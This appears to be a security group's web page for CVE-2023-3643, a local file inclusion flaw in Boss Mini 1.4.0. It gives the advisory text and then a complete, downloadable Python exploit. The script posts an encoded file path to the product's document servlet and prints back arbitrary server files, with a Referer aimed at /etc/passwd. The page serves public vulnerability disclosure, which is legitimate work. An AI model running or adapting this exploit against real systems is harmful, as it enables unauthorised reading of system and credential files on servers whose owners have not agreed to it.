---
layout: default
---

- # Research
  <details><summary>Exploring IDOR with Bitwise Operators</summary>
  <br>
  <blockquote>by vpr</blockquote></details>

<br>
- #  CVE
  <details><summary>CVE-2023-3643 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3643" target="_blank"> <!></a></summary>
  <br><blockquote>
  A vulnerability was found in Boss Mini 1.4.0 Build 6221. It has been classified as critical. This affects an unknown part of the file boss/servlet/document. The manipulation of the argument path leads to file inclusion. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-233889 was assigned to this vulnerability.</blockquote></details>

<br>
- # Exploit
  <details><summary>CVE-2023-3643</summary>
  <br>
  <pre>
  <code id="code-block">
  # Exploit Title: Boss Mini 1.4.0 (Build 6221) - Local File Inclusion (LFI)
  # Date: 07/12/2023
  # Exploit Author: [nltt0] (https://github.com/nltt-br))
  # CVE: CVE-2023-3643


  '''
  _____       _                              _____ 
  /  __ \     | |                            /  ___|
  | /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--. 
  | |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
  | \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
  \____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/ 
                              __/ |                 
                            |___/                  

  '''

  from requests import post 
  from urllib.parse import quote
  from argparse import ArgumentParser

  try:
      parser = ArgumentParser(description='Local file inclusion [Boss Mini]')
      parser.add_argument('--domain', required=True, help='Application domain')
      parser.add_argument('--file', required=True, help='Local file')

      args = parser.parse_args()
      host = args.domain
      file = args.file
      url = '{}/boss/servlet/document'.format(host)
      file2 = quote(file, safe='')

      headers = {
          'Host': host,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange',
          'Referer': 'https://{}/boss/app/report/popup.html?/etc/passwd'.format(host)
      }


      data = {
          'path': file2
      }

      try:
          req = post(url, headers=headers, data=data, verify=False)
          if req.status_code == 200:
              print(req.text)

      except Exception as e:
          print('Error in {}'.format(e))   
        

  except Exception as e:
      print('Error in {}'.format(e))
  
  
  </code></pre>
  <button onclick="downloadCode()">Download</button>
  
  </details>

<script>
  function downloadCode() {
    const codeContent = document.getElementById("code-block").innerText;
    const blob = new Blob([codeContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "CVE-2023-3643.py";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }
</script>


<br>
<br>
<a href="https://www.linkedin.com/company/calangos-security/" target="_blank"><img src="/assets/images/calangoss-icon2.png" width="100" height="68" style="display: block;
  margin-left: auto;
  margin-right: auto;
  ">
</a>